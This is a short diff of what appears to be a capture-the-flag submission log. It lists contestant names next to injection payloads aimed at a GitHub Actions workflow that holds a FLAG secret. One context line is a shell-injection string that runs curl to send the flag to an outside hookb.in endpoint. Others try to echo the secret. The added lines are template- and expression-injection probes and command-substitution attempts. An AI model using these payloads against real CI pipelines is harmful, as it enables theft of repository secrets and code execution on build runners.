@@ -731,3 +731,8 @@ ${{ github.event.issue.user.login }}
 ${{ secrets.FLAG }}
 wgblikeW:a";set${IFS}+e;${IFS}curl${IFS}https://hookb.in/XkYGbdzLGOsDYMQQY1Kd?flag=${flag};#
 Ha1f00L:" | echo "${{ secrets.FLAG }}
+Zeker62:{{1+33}}
+{}{}{{}
+{{2*7}}
+${{ github.event.issue.number }} $( flag )
+";echo ls -an"
